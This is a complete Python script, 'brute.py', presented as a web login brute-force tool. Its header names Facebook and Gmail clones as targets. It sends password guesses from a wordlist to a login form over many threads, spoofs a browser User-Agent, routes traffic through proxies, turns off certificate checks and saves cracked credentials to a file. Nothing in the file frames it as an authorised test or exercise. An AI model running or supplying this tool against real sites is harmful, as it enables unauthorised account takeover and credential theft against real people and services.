#!/usr/bin/env python3
# brute.py — HTTP Form Brute Force Tool
# Target: any web login form (Facebook, Gmail clone, custom panels)
# Runtime: Python 3.8+  |  pip install requests colorama

import requests
import threading
import argparse
import sys
import time
from queue import Queue
from colorama import Fore, Style, init

init(autoreset=True)

BANNER = f"""
\033[36m
  ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   █████╗
  ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝
  ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
        WEB LOGIN BRUTE FORCE — @#9002111185000#
\033[0m
"""

found_flag = threading.Event()
attempt_count = 0
lock = threading.Lock()

def try_login(url, username, password, user_field, pass_field,
              fail_string, session, proxies, cookies, extra_data):
    global attempt_count
    payload = {user_field: username, pass_field: password}
    if extra_data:
        payload.update(extra_data)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": url,
    }
    try:
        resp = session.post(url, data=payload, headers=headers,
                            proxies=proxies, cookies=cookies,
                            timeout=10, allow_redirects=True, verify=False)
        with lock:
            attempt_count += 1
        if fail_string.lower() not in resp.text.lower():
            return True, resp
        return False, resp
    except requests.exceptions.RequestException as e:
        with lock:
            print(f"\033[33m[!] Connection error: {e}\033[0m")
        return False, None

def worker(url, username, user_field, pass_field,
           fail_string, queue, delay, proxies, cookies, extra_data):
    session = requests.Session()
    while not found_flag.is_set():
        try:
            password = queue.get(timeout=1)
        except:
            break
        success, resp = try_login(url, username, password, user_field,
                                   pass_field, fail_string, session,
                                   proxies, cookies, extra_data)
        with lock:
            status = resp.status_code if resp else "ERR"
            print(f"\033[37m[{attempt_count}] \033[34mTrying:\033[0m "
                  f"{username}:{password}  [HTTP {status}]")
        if success:
            found_flag.set()
            print(f"\n\033[32m[+] FOUND! Username: {username}  Password: {password}\033[0m\n")
            with open("cracked.txt", "a") as f:
                f.write(f"{url} | {username} | {password}\n")
            break
        if delay > 0:
            time.sleep(delay)
        queue.task_done()

def load_wordlist(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"\033[31m[-] Wordlist not found: {path}\033[0m")
        sys.exit(1)

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="HTTP Form Brute Force Tool")
    parser.add_argument("-u",  "--url",        required=True)
    parser.add_argument("-U",  "--username",   required=True)
    parser.add_argument("-w",  "--wordlist",   required=True)
    parser.add_argument("-uf", "--user-field", default="email")
    parser.add_argument("-pf", "--pass-field", default="pass")
    parser.add_argument("-f",  "--fail",       default="invalid password")
    parser.add_argument("-t",  "--threads",    type=int, default=10)
    parser.add_argument("-d",  "--delay",      type=float, default=0)
    parser.add_argument("-x",  "--proxy",      default=None)
    parser.add_argument("-e",  "--extra",      default=None)
    args = parser.parse_args()

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    extra_data = {}
    if args.extra:
        for pair in args.extra.split(","):
            k, v = pair.split("=", 1)
            extra_data[k.strip()] = v.strip()

    passwords = load_wordlist(args.wordlist)
    queue = Queue()
    for pw in passwords:
        queue.put(pw)

    print(f"\033[36m[*] Target   : {args.url}")
    print(f"[*] Username : {args.username}")
    print(f"[*] Wordlist : {len(passwords)} passwords")
    print(f"[*] Threads  : {args.threads}")
    print(f"[*] Fail str : '{args.fail}'")
    if proxies:
        print(f"[*] Proxy    : {args.proxy}")
    print(f"\033[0m")

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(
            target=worker,
            args=(args.url, args.username, args.user_field, args.pass_field,
                  args.fail, queue, args.delay, proxies, {}, extra_data),
            daemon=True,
        )
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if not found_flag.is_set():
        print(f"\n\033[31m[-] Password not found in wordlist.\033[0m")
    print(f"\n\033[36m[*] Total attempts: {attempt_count}\033[0m")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    main()
